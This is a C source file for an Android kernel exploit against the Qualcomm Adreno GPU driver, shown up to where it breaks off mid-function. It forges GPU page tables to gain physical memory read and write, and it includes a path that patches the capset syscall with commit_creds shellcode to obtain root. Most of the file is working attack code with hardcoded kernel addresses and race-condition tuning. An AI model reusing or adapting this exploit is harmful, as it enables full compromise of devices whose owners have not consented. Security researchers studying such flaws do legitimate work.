#define __BIONIC_DEPRECATED_PAGE_SIZE_MACRO

#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include "adrenaline.h"
#include "pa_leak.h"
#include <signal.h>
#include <string.h>
#include <stdbool.h>
#include <sys/wait.h>
#include <sys/capability.h>

#define KGSL_MEMFLAGS_IOCOHERENT 0x80000000ULL

// from adrenaline.cpp:
// https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html

/* modified version of kilroy's kgsl_ctx_create. create a KGSL context that will use
 * ringbuffer 0, and make sure KGSL_CONTEXT_USER_GENERATED_TS is disabled */
int kgsl_ctx_create0(int fd, uint32_t *ctx_id) {
    struct kgsl_drawctxt_create req = {
            .flags = 0x00001812, // low prio, rb 0
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &req);
    if (ret)
        return ret;

    *ctx_id = req.drawctxt_id;

    return 0;
}

/* cleanup an existing GPU context */
int kgsl_ctx_destroy(int fd, uint32_t ctx_id) {
    struct kgsl_drawctxt_destroy req = {
            .drawctxt_id = ctx_id,
    };

    return ioctl(fd, IOCTL_KGSL_DRAWCTXT_DESTROY, &req);
}

#define KGSL_MEMFLAGS_GPUREADONLY 0x01000000U

/* modified version of kilroy's kgsl_map. the choice to use KGSL_MEMFLAGS_USE_CPU_MAP
 * comes from earlier debugging efforts, but a normal user mapping should work as well,
 * it would just need to use uint64_t and drop the flags. */
// https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/kgsl_utils.c#L59
int kgsl_map(int fd, unsigned long addr, size_t len, uint64_t *gpuaddr) {
    struct kgsl_map_user_mem req = {
            .len = len,
            .offset = 0,
            .hostptr = addr,
            .memtype = KGSL_USER_MEM_TYPE_ADDR,
            // .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
    };
    int ret;

    ret = ioctl(fd, IOCTL_KGSL_MAP_USER_MEM, &req);
    if (ret)
        return ret;

    *gpuaddr = req.gpuaddr;

    return 0;
}

/* send pad IBs and a payload IB at a specific index to the GPU. the index is chosen to win
 * the race condition with the targeted context switch */
int kgsl_gpu_command_payload(int fd, uint32_t ctx_id, uint64_t gpuaddr, uint32_t cmdsize, uint32_t n, uint32_t target_idx, uint64_t target_cmd, uint32_t target_size) {
    struct kgsl_command_object *cmds;

    struct kgsl_gpu_command req = {
            .context_id = ctx_id,
            .cmdsize = sizeof(struct kgsl_command_object),
            .numcmds = n,
    };
    size_t cmds_size;
    uint32_t i;

    cmds_size = n * sizeof(struct kgsl_command_object);

    cmds = (struct kgsl_command_object *) malloc(cmds_size);

    if (cmds == NULL) {
        return -1;
    }

    memset(cmds, 0, cmds_size);

    for (i = 0; i < n; i++) {
        cmds[i].flags = KGSL_CMDLIST_IB;

        if (i == target_idx) {
            cmds[i].gpuaddr = target_cmd;
            cmds[i].size = target_size;
        }
        else {
            /* the shift here is helpful for debugging failed alignment */
            cmds[i].gpuaddr = gpuaddr + (i << 16);
            cmds[i].size = cmdsize;
        }
    }

    req.cmdlist = (unsigned long) cmds;

    int err = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &req);

    free(cmds);
    return err;
}

// TODO(zhuowei): make 2G spray configurable; should be ~1/4 to 1/2 of RAM
// increased this from 1G to 2G for Pixel 3 XL
// spray 16mb per mapping: 16MB*256=4GB
#define NPBUFS 1

#define LEVEL1_SHIFT    30
#define LEVEL1_MASK     (0x1fful << LEVEL1_SHIFT)

#define LEVEL2_SHIFT    21
#define LEVEL2_MASK     (0x1ff << LEVEL2_SHIFT)

#define LEVEL3_SHIFT    12
#define LEVEL3_MASK     (0x1ff << LEVEL3_SHIFT)

#define ENTRY_VALID     3
#define ENTRY_RW        (1 << 6)

/* Normal Non-Cacheable memory */
#define ENTRY_MEMTYPE_NNC   (3 << 2)

/* "outer attributes are exported from the processor to the external memory bus
 * and are therefore potentially used by cache hardware external to the core or
 * cluster" */
#define ENTRY_OUTER_SHARE (2 << 8)

/* Active */
#define ENTRY_AF (1<<10)

/* Non-Global */
#define ENTRY_NG (1<<11)

int setup_pagetables(uint8_t *tt0, uint32_t pages, uint64_t tt0phys, uint64_t fake_gpuaddr, uint64_t target_pa) {
    uint64_t *level_base;
    uint64_t level1_index, level2_index, level3_index;
    int i;

    for (i = 0; i < pages; i++) {
        level_base = (uint64_t *) (tt0 + (i * PAGE_SIZE));

        memset(level_base, 0x45, 4096);

        level1_index = (fake_gpuaddr & LEVEL1_MASK) >> LEVEL1_SHIFT;
        level2_index = (fake_gpuaddr & LEVEL2_MASK) >> LEVEL2_SHIFT;
        level3_index = (fake_gpuaddr & LEVEL3_MASK) >> LEVEL3_SHIFT;

        if (level1_index == level2_index || level1_index == level3_index ||
            level2_index == level3_index) {
            return -1;
        }

        level_base[level1_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level2_index] = (uint64_t) tt0phys | ENTRY_VALID;
        level_base[level3_index] = (uint64_t) (target_pa | ENTRY_VALID | ENTRY_RW |
                                               ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                               ENTRY_NG);
        // zhuowei: always have a self mapping
        level_base[level3_index + 1] = (uint64_t) (tt0phys | ENTRY_VALID | ENTRY_RW |
                                                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                                                ENTRY_NG);
        // hack
        for (int i = 0; i < 16; i++) {
            int index = level3_index + 2 + i;
            if (index == level1_index || index == level2_index || index == level3_index) {
                return -1;
            }
            level_base[index] = (uint64_t) (target_pa + (i*0x1000) | ENTRY_VALID | ENTRY_RW |
                ENTRY_MEMTYPE_NNC | ENTRY_OUTER_SHARE | ENTRY_AF |
                ENTRY_NG);
        }
    }

    return 0;
}

// From Mesa/Freedreno/Turnip

static inline void
tu_sync_cacheline_to_gpu(void const *p __attribute__((unused)))
{
   /* Clean data cache. */
   __asm volatile("dc cvac, %0" : : "r" (p) : "memory");
}

static inline void
tu_sync_cacheline_from_gpu(void const *p __attribute__((unused)))
{
   /* Clean and Invalidate data cache, there is no separate Invalidate. */
   __asm volatile("dc civac, %0" : : "r" (p) : "memory");
}

uint32_t
tu_get_l1_dcache_size()
{
   /* Bionic does not implement _SC_LEVEL1_DCACHE_LINESIZE properly: */
   uint64_t ctr_el0;
   asm("mrs\t%x0, ctr_el0" : "=r"(ctr_el0));
   return 4 << ((ctr_el0 >> 16) & 0xf);
}

static uint64_t g_level1_dcache_size;

static void sync_cache_to_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_to_gpu(start);
    }
}

static void sync_cache_from_gpu(void* start, void* end) {
    start = (char *) ((uintptr_t) start & ~(g_level1_dcache_size - 1));
    for (; start < end; start += g_level1_dcache_size) {
        tu_sync_cacheline_from_gpu(start);
    }
}

// #define DUMP_PAGEMAP
#ifdef DUMP_PAGEMAP
// https://github.com/NEWBEE108/linux_kernel_module_Info/blob/master/kernel_module/user/pagemap_dump.c
// https://github.com/torvalds/linux/blob/master/Documentation/admin-guide/mm/pagemap.rst
uint64_t GetPhys(int pagemap_fd, uint64_t virt) {
    uint64_t pagemap_data = 0;
    if (pread(pagemap_fd, &pagemap_data, sizeof(pagemap_data), (virt / 4096ull) * sizeof(uint64_t)) != sizeof(pagemap_data)) {
        return 0;
    }
    uint64_t mask = (1ull << 55) - 1; // bits 0-54
    return (pagemap_data & mask) * 4096;
}
#endif

#define CP_WAIT_MEM_WRITES 0x12
#define CP_SET_DRAW_STATE 0x43
#define CP_SET_MODE 0x63
#define CP_INDIRECT_BUFFER 0x3f
#define DRAW_STATE_MODE_BINNING 0x1
#define DRAW_STATE_MODE_GMEM 0x2
#define DRAW_STATE_MODE_BYPASS 0x4
#define DRAW_STATE_DIRTY (1 << 16)
#define CP_SMMU_TABLE_UPDATE 0x53
#define CP_CONTEXT_SWITCH_YIELD 0x6b

uint64_t cheese_decode_adrp(uint32_t instr, uint64_t pc);

struct cheese_gpu_rw {
    int fd;
    uint32_t ctx_id;

    uint32_t* payload_buf;
    uint64_t payload_gpuaddr;
    uint32_t* output_buf;
    uint64_t output_gpuaddr;

    void* target_physical_page;

    uint64_t phyaddr;

    void* garbage;
};

const uint64_t kFakeGpuAddr = 0x40403000;
const uint64_t kGarbageSize = 16 * 1024 * 1024;

static uint32_t g_marker = 0x41414141u;
/* When set, writes are performed as an inline CP_MEM_TO_MEM copy from a staged slot in our own
 * table page instead of CP_MEM_WRITE (which appears to be deferred until after TTBR0 is restored). */
static int g_write_via_copy = 0;
/* A leading CP_MEM_WRITE does not establish the hijacked translation and appears to poison the rest
 * of the drawstate (even the completion marker is lost). A leading CP_MEM_TO_MEM does establish it.
 * So: optionally emit a dummy MEM_TO_MEM preamble before writes. */
static int g_write_preamble = 0;
/* Use a different VA page for the write than the one the setup read used: the SMMU may cache the
 * page translation for the VA page touched first, so later accesses through it hit a stale entry.
 * The fake table's extra entries map target_pa + i*0x1000, so VA kFakeGpuAddr + (2+i)*0x1000
 * reaches the same physical page through a *fresh* VA page. */
static int g_write_va_extra = 0;
#define K_COPY_SRC_VA (kFakeGpuAddr + 0x1200)   /* -> table page + 0x200 */

static void cheese_stage_dword(void *tpage, uint32_t val) {
    *(uint32_t *)((char *)tpage + 0x200) = val;
    sync_cache_to_gpu((char *)tpage + 0x200, (char *)tpage + 0x204);
}

static int DoWrite(int fd, int ctx_id, uint32_t* payload_buf, uint64_t payload_gpuaddr, uint64_t phyaddr, uint64_t completion_marker_write_addr, bool write, uint64_t write_addr, uint32_t count, uint32_t* values) {
    uint32_t* drawstate_buf = payload_buf + 0x100;
    uint64_t drawstate_gpuaddr = payload_gpuaddr + 0x100*sizeof(uint32_t);
    uint32_t* drawstate_cmds = drawstate_buf;
    *drawstate_cmds++ = cp_type7_packet(CP_SMMU_TABLE_UPDATE, 4);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, phyaddr);
    *drawstate_cmds++ = 0;
    *drawstate_cmds++ = 0;
    drawstate_cmds += cp_wait_for_me(drawstate_cmds);
    drawstate_cmds += cp_wait_for_idle(drawstate_cmds);
    if (write) {
        if (g_write_preamble) {
            /* dummy copy: read the target into a scratch slot in our table page */
            *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
            *drawstate_cmds++ = 0;
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, K_COPY_SRC_VA + 0x10);
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
        }
        uint64_t wdst = write_addr + ((uint64_t)g_write_va_extra << 12);
        if (g_write_via_copy) {
            /* Inline copy: dest = target address, src = staged slot in our table page. */
            for (uint32_t i = 0; i < count; i++) {
                *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
                *drawstate_cmds++ = 0;
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, wdst + 4u * i);
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, K_COPY_SRC_VA + 4u * i);
            }
        } else {
            *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 2 + count);
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, wdst);
            for (int i = 0; i < count; i++) {
                *drawstate_cmds++ = values[i];
            }
        }
    } else {
        if (count == 1) {
            *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
            *drawstate_cmds++ = 0;
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4);
            drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr);
        } else {
            // hack...
            for (int i = 0; i < count; i++) {
                *drawstate_cmds++ = cp_type7_packet(CP_MEM_TO_MEM, 5);
                *drawstate_cmds++ = 0;
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr + 4 + 4*i);
                drawstate_cmds += cp_gpuaddr(drawstate_cmds, write_addr + i*0x1000);
            }
        }
    }
    *drawstate_cmds++ = cp_type7_packet(CP_MEM_WRITE, 3);
    drawstate_cmds += cp_gpuaddr(drawstate_cmds, completion_marker_write_addr);
    *drawstate_cmds++ = g_marker;

    uint32_t* payload_cmds = payload_buf;
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=527;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    // This causes all drawstates to run immediately - see CP_SET_DRAW_STATE handler's disassembly
    *payload_cmds++ = cp_type7_packet(CP_SET_MODE, 1);
    *payload_cmds++ = 1;
    *payload_cmds++ = cp_type7_packet(CP_SET_DRAW_STATE, 3);
    // https://cs.android.com/android/platform/superproject/main/+/main:external/mesa3d/src/freedreno/registers/adreno/adreno_pm4.xml;l=1089;drc=2038d363e7e733c0fc04dc123574cbd8b62b9a6e
    *payload_cmds++ = (drawstate_cmds - drawstate_buf) | ((DRAW_STATE_MODE_BINNING | DRAW_STATE_MODE_GMEM | DRAW_STATE_MODE_BYPASS) << 20);
    payload_cmds += cp_gpuaddr(payload_cmds, drawstate_gpuaddr);

    uint32_t cmd_size = (payload_cmds - payload_buf) * sizeof(uint32_t);

#if 1
    fprintf(stderr, "running commands: %x %lx %x\n", ctx_id, payload_gpuaddr, cmd_size);
    for (int i = 0; i < cmd_size / sizeof(uint32_t); i++) {
        fprintf(stderr, "%x ", payload_buf[i]);
    }
    fprintf(stderr, "\n");
    for (int i = 0; i < drawstate_cmds - drawstate_buf; i++) {
        fprintf(stderr, "%x ", drawstate_buf[i]);
    }
    fprintf(stderr, "\n");
#endif
    sync_cache_to_gpu((void*)payload_buf, ((void*)payload_buf) + 0x1000);
    // we don't need Adrenaline's multiple IB stuff - we just use it to run one IB
    // see https://github.com/github/securitylab/blob/105618fc1fa83c08f4446749e64310b539cb0262/SecurityExploits/Android/Qualcomm/CVE_2022_25664/adreno_kernel/adreno_kernel.c#L188
    int err = kgsl_gpu_command_payload(fd, ctx_id, /*gpuaddr=*/0, /*cmd_size=*/0, /*n=*/1, /*target_idx=*/0, payload_gpuaddr, cmd_size);
    if (err) {
        fprintf(stderr, "Can't run payload: %s\n", strerror(err));
        return 1;
    }
    return 0;
}

const uint64_t gPhyAddrs[] = {0xfebeb000, 0xd0b3b000, 0xbe690000, 0xd5cf0000};

const uint64_t kKernelPageTableEntry = 0x1e0;


/* --- generic physical read/write helpers (owner-authorized research) --- */
static uint32_t cheese_read_dword(int fd, int ctx_id, uint32_t *payload_buf, uint64_t payload_gpuaddr,
                                  void *tpage, uint64_t phyaddr, uint64_t pa, uint32_t tag) {
    if (setup_pagetables(tpage, 1, phyaddr, kFakeGpuAddr, pa & ~0xfffull)) return 0xdeadbeef;
    sync_cache_to_gpu(tpage, (char *)tpage + 0x1000);
    g_marker = tag;
    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100,
                /*write=*/false, kFakeGpuAddr + (pa & 0xfff), 1, NULL)) return 0xdeadbeef;
    for (int t = 0; t < 3000; t++) {
        sync_cache_from_gpu(tpage, (char *)tpage + 0x1000);
        if (*(volatile uint32_t *)((char *)tpage + 0x100) == tag) break;
        usleep(200);
    }
    /* The MEM_TO_MEM result copy can land AFTER the marker write, so poll the result
     * slot until it changes from the 0x45454545 page fill (the CP may reorder them). */
    for (int t = 0; t < 1000; t++) {
        sync_cache_from_gpu(tpage, (char *)tpage + 0x1000);
        if (*(volatile uint32_t *)((char *)tpage + 0x104) != 0x45454545u) break;
        usleep(200);
    }
    return *(uint32_t *)((char *)tpage + 0x104);
}

static int cheese_write_dwords(int fd, int ctx_id, uint32_t *payload_buf, uint64_t payload_gpuaddr,
                               void *tpage, uint64_t phyaddr, uint64_t pa, uint32_t *vals,
                               uint32_t count, uint32_t tag) {
    /* KERNEL TEXT PATCH. Two constraints pull in opposite directions:
     *   - the patch must happen fast (modifications appear to be reverted shortly after landing),
     *   - but losing the TTBR0 race faults the GPU, and KGSL throttles after 3 faults in 3 s, which
     *     then blocks every later command (including the restore).
     * Compromise: one process (no re-exec), a FRESH KGSL context per dword (its own fault budget),
     * ~1.2 s pacing so faults stay under the throttle, and up to 3 attempts per dword. */
    for (uint32_t i = 0; i < count; i++) {
        uint64_t a = pa + 4 * i;
        int done = 0;
        for (int attempt = 0; attempt < 3 && !done; attempt++) {
            uint32_t ctx = ctx_id;
            if (i > 0 || attempt > 0) {
                if (kgsl_ctx_create0(fd, &ctx)) { usleep(800000); continue; }
            }
            int rc = 0;
            if (setup_pagetables(tpage, 1, phyaddr, kFakeGpuAddr, a & ~0xfffull)) rc = -1;
            if (!rc) {
                sync_cache_to_gpu(tpage, (char *)tpage + 0x1000);
                g_marker = tag + i;
                rc = DoWrite(fd, ctx, payload_buf, payload_gpuaddr, phyaddr,
                             kFakeGpuAddr + 0x1100, /*write=*/true,
                             kFakeGpuAddr + (a & 0xfff), 1, &vals[i]);
            }
            if (i > 0 || attempt > 0) kgsl_ctx_destroy(fd, ctx);
            if (!rc) { done = 1; break; }
            usleep(1500000);          /* back off: let the 3-faults/3s window clear */
        }
        if (!done) {
            fprintf(stderr, "  write[%u] failed after retries (throttled?)\n", i);
            return -1;
        }
        usleep(1200000);              /* pace: stay under the fault throttle */
    }
    uint32_t f = cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr, tpage, phyaddr, pa, tag + 0x100);
    uint32_t l = cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr, tpage, phyaddr,
                                   pa + 4 * (count - 1), tag + 0x200);
    fprintf(stderr, "  write verify: first=%#x (want %#x) last=%#x (want %#x) %s\n",
            f, vals[0], l, vals[count - 1], (f == vals[0] && l == vals[count - 1]) ? "OK" : "MISMATCH");
    return (f == vals[0] && l == vals[count - 1]) ? 0 : -1;
}


/* Single-command bulk patch: stage the values in our own table page (table+0x200..) and write them
 * with ONE drawstate containing N CP_MEM_TO_MEM copies. Rationale: losing the TTBR0 race faults the
 * GPU and KGSL throttles after 3 faults in 3 s, so 13 separate commands frequently die mid-patch and
 * leave a half-written function behind. One command = one race window and no partial patch. */
static int cheese_bulk_write(int fd, int ctx_id, uint32_t *payload_buf, uint64_t payload_gpuaddr,
                             void *tpage, uint64_t phyaddr, uint64_t pa, uint32_t *vals,
                             uint32_t count, uint32_t tag) {
    for (uint32_t i = 0; i < count; i++)
        *(uint32_t *)((char *)tpage + 0x200 + 4 * i) = vals[i];
    sync_cache_to_gpu((char *)tpage + 0x200, (char *)tpage + 0x200 + 4 * count);
    if (setup_pagetables(tpage, 1, phyaddr, kFakeGpuAddr, pa & ~0xfffull)) return -1;
    sync_cache_to_gpu(tpage, (char *)tpage + 0x1000);
    g_write_via_copy = 1;
    g_marker = tag;
    int rc = DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr,
                     kFakeGpuAddr + 0x1100, /*write=*/true,
                     kFakeGpuAddr + (pa & 0xfff), count, vals);
    g_write_via_copy = 0;
    if (rc) { fprintf(stderr, "  bulk write: command failed\n"); return -1; }
    usleep(20000);
    return 0;
}

int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
#ifdef DUMP_PAGEMAP
    int pagemap_fd = getuid() == 0? open("/proc/self/pagemap", O_RDONLY|O_CLOEXEC): -1;
#endif

    // strings - xbl_config.img |grep Kernel
    // 0xA8000000, 0x10000000, "Kernel",            AddMem, SYS_MEM, SYS_MEM_CAP, Reserv, WRITE_BACK_XN
    // https://www.longterm.io/cve-2020-0423.html
    // https://github.com/LineageOS/android_kernel_google_msm-4.9/blob/cf7420326fc9659917177acb536a2a9a8bf65bfc/arch/arm64/kernel/vmlinux.lds.S#L236
    // https://duasynt.com/blog/android-pgd-page-tables
    // https://docs.kernel.org/arch/arm64/booting.html
    // kernel physical base + image_size - 0x1000 (tramp_pg_dir)
    // https://developer.arm.com/-/media/Arm%20Developer%20Community/PDF/Kernel_Mitigations_Detail_v1.5.pdf?revision=a8859ae4-5256-47c2-8e35-a2f1160071bb&la=en
    // https://conference.hitb.org/hitbsecconf2019ams/materials/D2T2%20-%20Binder%20-%20The%20Bridge%20to%20Root%20-%20Hongli%20Han%20&%20Mingjian%20Zhou.pdf
    uint64_t kernel_physical_memory_region = 0xA8000000;
    //uint64_t swapper_pg_dir_phys = kernel_physical_memory_region + kernel_load_offset - 0x2000ull;
    //uint64_t target_write_physical_address = tramp_pg_dir_phys + (kKernelPageTableEntry * sizeof(uint64_t));
    uint64_t kernel_read_offset = 0x4; // read the first jump to see how large the kernel is in memory
    uint64_t target_read_physical_address = kernel_physical_memory_region + kernel_read_offset;
    if (getenv("CHEESE_TARGET_PA")) {
        target_read_physical_address = strtoull(getenv("CHEESE_TARGET_PA"), NULL, 0);
        fprintf(stderr, "target PA override = 0x%lx\n", target_read_physical_address);
    }
    uint64_t tramp_pte_target = 0x80000000;
    // that page has 0x00e8000000000751, which is:
    // https://developer.arm.com/documentation/101811/0104/Controlling-address-translation-Translation-table-format
    // block descriptor (0b01 << 0)
    // https://github.com/codingbelief/arm-architecture-reference-manual-for-armv8-a/blob/master/en/chapter_d4/d43_3_memory_attribute_fields_in_the_vmsav8-64_translation_table_formats_descriptors.md
    // AttrIndx = 0b100 << 2 -> MAIR_EL0 [4] <- on v4.9 this is MT_NORMAL
    // NS=0 <<5
    // AP=0b01 << 6 - full access, https://developer.arm.com/documentation/ddi0406/b/System-Level-Architecture/Virtual-Memory-System-Architecture--VMSA-/Memory-access-control/Access-permissions?lang=en
    // SH=0b11 << 8
    // AF=1 << 10
    // nG=0
    // DBM=1 << 51
    // cont=0 << 52
    // pxn=1 << 53 ??
    // uxn=1 << 54
    // nonSecure = 1 << 55
    // we want MT_NORMAL on 5.10, which has AttrIndx index 0 (Checked: 5.10 (in qemu) kernel is mapped with 0x0044000040200781)
    // so need to change AttrIndx to 0: 0xe8000000000741
    uint64_t tramp_pte_value = tramp_pte_target | 0xe8000000000741;
    //uint64_t tramp_pte_value = 0x41414141;

    // from Adrenaline: spray physical memory
    /* this is the physical address of the fake page table that we will point the SMMU TTBR0 to.
     *
     * it's chosen more or less at random based on results of performing a similar spray and then
     * checking commonly recurring entries in /proc/self/pagemap
     */
    /* --- self-test victim: a page we fill with a magic value and whose PA we leak --- */
    uint8_t *victim = NULL;
    uint64_t victim_pa = 0;
    if (getenv("CHEESE_SELFTEST")) {
        victim = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        *(uint32_t *)(victim + 0x40) = 0xc0ffee11u;
        mlock(victim, PAGE_SIZE);
        victim_pa = leak_phys_page(victim);
        sync_cache_to_gpu(victim, victim + PAGE_SIZE);   /* CPU wrote it; make DRAM see it */
        target_read_physical_address = victim_pa + 0x40;
        fprintf(stderr, "SELFTEST victim_pa=0x%lx expect=0xc0ffee11\n", victim_pa);
    }

    uint64_t phyaddr = 0xfebeb000;
    if (getenv("CHEESE_PHYADDR")) {
        phyaddr = strtoull(getenv("CHEESE_PHYADDR"), NULL, 0);
    } else if (getenv("CHEESE_ATTEMPT")) {
        phyaddr = gPhyAddrs[atoi(getenv("CHEESE_ATTEMPT"))];
    }

    /* spray 16mb per mapping */
    uint64_t pbuf_len = PAGE_SIZE;  /* PA-leak port: one page, known physical address */
    uint8_t *pbufs[NPBUFS];

    /* this loop is spraying a fake page table so that it hopefully lands at a fixed physical
     * address. one way that the exploit can fail is if this page has already been allocated,
     * in which case a reboot might be necessary */
    for (int i = 0; i < NPBUFS; i++) {
        uint8_t * pbuf = (uint8_t *) mmap(NULL, pbuf_len, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);

        if (pbuf == (uint8_t *) MAP_FAILED) {
            fprintf(stderr, "pbuf mmap failed (%d)\n", i);
            return 1;
        }

        /* PA-leak port: learn this page's physical address and use it as the
         * self-referential page-table address. No spray lottery, no wild walks. */
        pbuf[0] = 0x5a;
        mlock(pbuf, pbuf_len);
        {
            uint64_t leaked = leak_phys_page(pbuf);
            if (leaked) {
                phyaddr = leaked;
                fprintf(stderr, "leaked table page PA = 0x%lx (va %p)\n", leaked, pbuf);
            } else {
                fprintf(stderr, "PA leak FAILED; using phyaddr 0x%lx\n", phyaddr);
            }
        }

        /* our fake gpuaddress (0x40403000) is chosen to allow level1/2/3 to be at different
         * offsets within the same page (e.g. level 1 = 0x1, level2 = 0x3, level3 = 0x3.
         *
         * the target physical page (0x821D9000) corresponds to sys_call_table, which is at
         * a fixed physical address that you can calculate by taking the base of "Kernel Code"
         * from /proc/iomem and then adding (sys_call_table - _text) from /proc/kallsyms */
        // zhuowei: actually, try to write to itself, please...
        int ret = setup_pagetables(pbuf, pbuf_len/4096, phyaddr, kFakeGpuAddr, target_read_physical_address & ~0xfffull);

        if (ret == -1) {
            fprintf(stderr, "setup_pagetables failed\n");
            return 1;
        }

        pbufs[i] = pbuf;
        //fprintf(stderr, "spray %p\n", pbuf);
#ifdef DUMP_PAGEMAP
        if (pagemap_fd != -1) {
            for (int off = 0; off < pbuf_len; off += 4096) {
                void* page_start = pbuf + off;
                fprintf(stderr, "addr: %p %p\n", page_start, (void*)GetPhys(pagemap_fd, (uint64_t)page_start));
            }
        }
#endif
        sync_cache_to_gpu((void*)pbuf, ((void*)pbuf) + pbuf_len);
    }
    // end spray
    //fprintf(stderr, "end spray\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR|O_CLOEXEC);
    if (fd == -1) {
        fprintf(stderr, "Can't open kgsl\n");
        return 1;
    }

    uint32_t ctx_id;

    int err = kgsl_ctx_create0(fd, &ctx_id);
    if (err) {
        fprintf(stderr, "Can't create context: %s\n", strerror(err));
        return 1;
    }

    uint32_t* payload_buf = mmap(NULL, PAGE_SIZE,
                                        PROT_READ|PROT_WRITE,
                                        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (payload_buf == MAP_FAILED) {
        fprintf(stderr, "Can't map buf: %s\n", strerror(errno));
        return 1;
    }

    uint64_t payload_gpuaddr;

    err = kgsl_map(fd, (unsigned long)payload_buf, PAGE_SIZE, &payload_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    uint32_t* output_buf = (uint32_t *) mmap(NULL, PAGE_SIZE,
        PROT_READ|PROT_WRITE,
        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

    uint64_t output_gpuaddr;
    err = kgsl_map(fd, (unsigned long)output_buf, PAGE_SIZE, &output_gpuaddr);
    if (err) {
        fprintf(stderr, "Can't map to gpu: %s\n", strerror(err));
        return 1;
    }

    if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr, kFakeGpuAddr + 0x1100, /*write=*/false, kFakeGpuAddr + (target_read_physical_address & 0xfffull), 1, NULL)) {
        fprintf(stderr, "Can't do first read\n");
    }
    sleep(1);

    void* target_physical_page = NULL;
    int target_pbuf = -1;

    for (int i = 0; i < NPBUFS; i++) {
        void* pbuf = pbufs[i];
        for (int off = 0; off < pbuf_len; off += 4096) {
            void* page_start = pbuf + off;
            sync_cache_from_gpu((void*)page_start, ((void*)page_start) + 0x1000);
            uint32_t* target = page_start + 0x100;
            if (target[0] == 0x41414141) {
                fprintf(stderr, "found it: virt addr = %p\n", page_start);
                target_physical_page = page_start;
                target_pbuf = i;
            }
        }
    }

    if (target_pbuf == -1) {
        fprintf(stderr, "can't find target\n");
        return 1;
    }

    uint32_t read_output = *(uint32_t*)(target_physical_page + 0x104);
    fprintf(stderr, "read output: %x\n", read_output);
    if (getenv("CHEESE_ROOT")) {
        /* Path 2: patch __do_sys_capset with commit_creds(&init_cred) shellcode.
         * Offline-resolved (kernel.Image, base 0xa8000000); slide from sys_call_table. */
        const uint64_t SYS_TABLE_PA   = 0xaa129578ull;
        const uint64_t DO_CAPSET_PA   = 0xa8145af0ull;
        const uint64_t LINK_SYS_WRITE = 0xffffffc00853f98cull;   /* nr 64 */
        const uint64_t LINK_SYS_CAPSET= 0xffffffc008145ac4ull;   /* nr 91 */
        const uint64_t LINK_INIT_CRED = 0xffffffc00a7b0ae0ull;
        const uint64_t LINK_COMMIT    = 0xffffffc008184c94ull;
        uint32_t tag = 0x3000;
        #define RD(addr) cheese_read_dword(fd, ctx_id, payload_buf, payload_gpuaddr, target_physical_page, phyaddr, (addr), tag++)
        /* Runtime addresses: prefer explicit env (slide validated out-of-band from
         * init_task.cred high dword == sys_call_table high dword == 0xffffffee,
         * i.e. slide = 0x2E41000000). Otherwise derive from init_task.cred. */
        const char *ic_env = getenv("CHEESE_INIT_CRED_RT");
        const char *cc_env = getenv("CHEESE_COMMIT_RT");
        uint64_t init_cred_rt, commit_rt;
        if (ic_env && cc_env) {
            init_cred_rt = strtoull(ic_env, NULL, 0);
            commit_rt    = strtoull(cc_env, NULL, 0);
            fprintf(stderr, "ROOT: env runtime addrs init_cred=%#lx commit_creds=%#lx\n",
                    (unsigned long)init_cred_rt, (unsigned long)commit_rt);
        } else {
            const uint64_t INIT_TASK_CRED_PA = 0xaa79c640ull;
            const uint64_t INIT_TASK_RCRED_PA = 0xaa79c638ull;
            uint32_t c_lo = RD(INIT_TASK_CRED_PA), c_hi = RD(INIT_TASK_CRED_PA + 4);
            uint32_t r_lo = RD(INIT_TASK_RCRED_PA), r_hi = RD(INIT_TASK_RCRED_PA + 4);
            uint64_t rt_cred  = ((uint64_t)c_hi << 32) | c_lo;
            uint64_t rt_rcred = ((uint64_t)r_hi << 32) | r_lo;
